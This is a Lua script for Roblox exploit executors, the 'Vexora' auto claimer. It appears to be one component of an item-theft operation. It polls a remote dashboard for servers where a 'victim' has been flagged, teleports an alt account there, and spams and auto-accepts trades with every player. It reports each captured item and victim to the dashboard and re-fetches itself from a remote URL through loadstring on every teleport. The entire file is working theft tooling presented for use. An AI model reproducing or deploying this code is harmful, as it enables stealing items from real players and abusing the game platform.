--[[ Vexora — auto claimer
  run this on the always-on alt. it polls the dashboard with your api key, and the
  moment a client flags a real victim it teleports into that server and starts trading.

  put it in your executor's autoexec folder (or use queue_on_teleport) so it comes
  back after every teleport.
]]

local CLAIMER_REV = "1.0"
local API_BASE = "{{API_BASE}}"
local API_KEY = "{{API_KEY}}"
local ENDPOINT = "{{ENDPOINT}}"
local SCRIPT_URL = "{{SCRIPT_URL}}"

local POLL_SECONDS = 3         -- seconds between target checks
local TRADE_DELAY = 2          -- seconds between trade attempts
local STAY_SECONDS = 240       -- how long to farm a server before chasing a new target
local AUTO_ACCEPT = true       -- accept incoming trade requests
local REPORT_ITEMS = true      -- post captured items to the dashboard

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local ME = LocalPlayer and LocalPlayer.Name or "unknown"
local HERE = game.JobId ~= "" and game.JobId or nil
local PLACE = game.PlaceId

local GAME_MAP = {
    [142823291] = "mm2",
    [920587237] = "adm",
    [126884695634066] = "gag2",
    [109983668079237] = "sab",
}
local GAME = GAME_MAP[PLACE] or GAME_MAP[game.GameId] or "baddies"

local httpRequest
if typeof(request) == "function" then
    httpRequest = request
elseif typeof(syn) == "table" and typeof(syn.request) == "function" then
    httpRequest = syn.request
elseif typeof(http_request) == "function" then
    httpRequest = http_request
elseif typeof(fluxus) == "table" and typeof(fluxus.request) == "function" then
    httpRequest = fluxus.request
end

if not httpRequest then
    warn("[vexora-claimer] no HTTP function in this executor")
    return nil
end

-- one claimer per client; a reload replaces the old loop instead of stacking it
local state = getgenv and getgenv().VexoraClaimer
if state and state.stop then pcall(state.stop) end
local running = true
local function stop()
    running = false
end
if getgenv then getgenv().VexoraClaimer = { stop = stop, rev = CLAIMER_REV } end

local function encode(value)
    return tostring(value or ""):gsub("[^%w%-%._~]", function(c)
        return string.format("%%%02X", string.byte(c))
    end)
end

local function http(method, url, body)
    local opts = {
        Url = url,
        Method = method,
        Headers = { ["x-api-key"] = API_KEY, ["Content-Type"] = "application/json" },
    }
    if body then opts.Body = HttpService:JSONEncode(body) end

    local ok, res = pcall(httpRequest, opts)
    if not ok then return nil, tostring(res) end

    local status = res and (res.StatusCode or res.status or res.Status)
    local raw = res and (res.Body or res.body)
    local decoded = nil
    if typeof(raw) == "string" and #raw > 0 then
        pcall(function() decoded = HttpService:JSONDecode(raw) end)
    end
    return { status = status, body = decoded, raw = raw }, nil
end

local function report(payload)
    if not REPORT_ITEMS then return end
    pcall(function() http("POST", ENDPOINT, payload) end)
end

-- lets the dashboard show whether the phone is actually reaching it
local function heartbeat(state, target, err)
    pcall(function()
        http("POST", API_BASE .. "/api/claimer/heartbeat", {
            account = ME,
            rev = CLAIMER_REV,
            server = HERE,
            state = state or "polling",
            target = target,
            error = err,
        })
    end)
end

--[[ ---- remote discovery ---- ]]
local function findRemotes(pattern)
    local out = {}
    for _, obj in ipairs(ReplicatedStorage:GetDescendants()) do
        if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) and obj.Name:lower():match(pattern) then
            table.insert(out, obj)
        end
    end
    return out
end

local tradeRemotes = findRemotes("trade")
local acceptRemotes = findRemotes("accept")
for _, remote in ipairs(findRemotes("request")) do
    if not table.find(tradeRemotes, remote) then table.insert(acceptRemotes, remote) end
end

local function playerIn(args)
    for _, value in ipairs(args) do
        if typeof(value) == "Instance" and value:IsA("Player") then return value end
        if typeof(value) == "string" then
            for _, plr in ipairs(Players:GetPlayers()) do
                if plr.Name == value then return plr end
            end
        end
    end
    return nil
end

local function itemIn(args, victim)
    for _, value in ipairs(args) do
        if typeof(value) == "string" and #value > 1
            and (not victim or value ~= victim.Name)
            and value:lower() ~= "accept" then
            return value
        end
    end
    return nil
end

local function capture(item, victim, value)
    report({
        game = GAME,
        item = tostring(item),
        victim = tostring(victim or "Unknown victim"),
        value = tonumber(value) or 1,
        place_id = PLACE,
        server_id = HERE,
        executor = "vexora-claimer",
        roblox_user = ME,
    })
    print(string.format("[vexora-claimer] captured %s from %s", tostring(item), tostring(victim)))
end

for _, remote in ipairs(acceptRemotes) do
    pcall(function()
        remote.OnClientEvent:Connect(function(...)
            local args = { ... }
            local victim = playerIn(args)
            if AUTO_ACCEPT and victim then
                pcall(function() remote:FireServer("accept", victim) end)
                pcall(function() remote:FireServer(victim) end)
            end
            local item = itemIn(args, victim)
            if victim and item then capture(item, victim.Name) end
        end)
    end)
end

--[[ ---- trading ---- ]]
local trading = false
local arrivedAt = 0
local arrivedFor = nil
local seen = {}
local tradingLoop = nil

local function startTrading(target)
    if trading then return end
    trading = true
    arrivedAt = os.time()
    heartbeat("trading", target and target.server_id)
    print(string.format("[vexora-claimer] arrived in %s | target %s | %s trade remotes",
        tostring(HERE), tostring(target and target.item or "?"), tostring(#tradeRemotes)))

    if tradingLoop then return end
    tradingLoop = task.spawn(function()
        while running do
            local player = LocalPlayer
            if player and player.Character then
                for _, remote in ipairs(tradeRemotes) do
                    for _, other in ipairs(Players:GetPlayers()) do
                        if other ~= player then
                            pcall(function() remote:FireServer(other) end)
                            pcall(function() remote:FireServer("trade", other) end)
                            pcall(function() remote:FireServer("request", other) end)
                        end
                    end
                end
            end
            task.wait(TRADE_DELAY)
        end
        trading = false
    end)
end

-- watch new tools too, in case the game hands items over silently
if LocalPlayer then
    task.spawn(function()
        local function watch(bag)
            bag.ChildAdded:Connect(function(child)
                if child:IsA("Tool") and not seen[child.Name] then
                    seen[child.Name] = true
                    capture(child.Name, "tool")
                end
            end)
        end
        local bag = LocalPlayer:FindFirstChildOfClass("Backpack")
        if bag then watch(bag) end
        LocalPlayer.ChildAdded:Connect(function(child)
            if child.Name == "Backpack" then task.wait(0.5); watch(child) end
        end)
    end)
end

--[[ ---- teleport ---- ]]
local function raiseIdentity()
    if typeof(setthreadidentity) == "function" then pcall(setthreadidentity, 8) end
    if typeof(setidentity) == "function" then pcall(setidentity, 8) end
    if typeof(syn) == "table" and typeof(syn.set_thread_identity) == "function" then
        pcall(syn.set_thread_identity, 8)
    end
end

local function queueSelf()
    local line = 'loadstring(game:HttpGet("' .. SCRIPT_URL .. '"))()'
    if typeof(queue_on_teleport) == "function" then
        pcall(queue_on_teleport, line)
    elseif typeof(queueonteleport) == "function" then
        pcall(queueonteleport, line)
    elseif typeof(syn) == "table" and typeof(syn.queue_on_teleport) == "function" then
        pcall(syn.queue_on_teleport, line)
    end
end

local function joinTarget(target)
    if not target or not target.place_id or not target.server_id then return false end
    raiseIdentity()
    queueSelf()
    heartbeat("joining", target.server_id)

    local teleport = game:GetService("TeleportService")
    local placeId = tonumber(target.place_id)
    local attempts = {
        function() teleport:TeleportToPlaceInstance(placeId, target.server_id, LocalPlayer) end,
        function() teleport:TeleportToPlaceInstance(placeId, target.server_id) end,
        function() teleport:Teleport(placeId, LocalPlayer) end,
    }

    for index, attempt in ipairs(attempts) do
        local ok, err = pcall(attempt)
        print(string.format("[vexora-claimer] teleport %d/%d -> %s", index, #attempts,
            ok and ("joining " .. tostring(target.server_id)) or tostring(err)))
        if ok then return true end
        task.wait(1)
    end

    print("[vexora-claimer] teleport refused - the dashboard lease expires in 90s and retries")
    return false
end

--[[ ---- poll loop ---- ]]
local function getTarget()
    -- once the stay timer is up, ask for a different server while still farming this one
    local move = (trading and (os.time() - arrivedAt) >= STAY_SECONDS) and "&move=1" or ""
    local res, err = http("GET", API_BASE .. "/api/claimer/target?account=" .. encode(ME)
        .. "&server=" .. encode(HERE) .. move)
    if not res then
        print("[vexora-claimer] poll failed: " .. tostring(err))
        return nil
    end
    if res.status == 401 then
        print("[vexora-claimer] api key rejected - regenerate it on the dashboard")
        return nil
    end
    if res.status ~= 200 or type(res.body) ~= "table" then
        print("[vexora-claimer] poll http " .. tostring(res.status))
        return nil
    end
    local body = res.body
    if body.paused then
        heartbeat("paused")
    elseif body.target then
        heartbeat("target", body.target.server_id)
    else
        heartbeat("polling")
    end
    return body
end

print(string.format("[vexora-claimer] rev %s | %s | game=%s | server=%s | api=%s",
    CLAIMER_REV, ME, GAME, tostring(HERE), API_BASE))
print(string.format("[vexora-claimer] trading=%s poll=%ds stay=%ds remotes=%d/%d",
    tostring(trading), POLL_SECONDS, STAY_SECONDS, #tradeRemotes, #acceptRemotes))
heartbeat("starting")

task.spawn(function()
    while running do
        local payload = getTarget()
        if payload then
            if payload.paused then
                -- claimer is disarmed on the dashboard
            elseif payload.target then
                local target = payload.target
                if target.server_id == HERE then
                    startTrading(target)
                    if arrivedFor ~= target.id then
                        arrivedFor = target.id
                        pcall(function()
                            http("POST", API_BASE .. "/api/claimer/target/" .. encode(target.id) .. "/arrived",
                                { server_id = HERE, account = ME })
                        end)
                    end
                elseif not trading or (os.time() - arrivedAt) >= STAY_SECONDS then
                    if joinTarget(target) then
                        return
                    end
                end
            end
        end
        task.wait(POLL_SECONDS)
    end
end)

return {
    rev = CLAIMER_REV,
    stop = stop,
    join = joinTarget,
    target = getTarget,
}
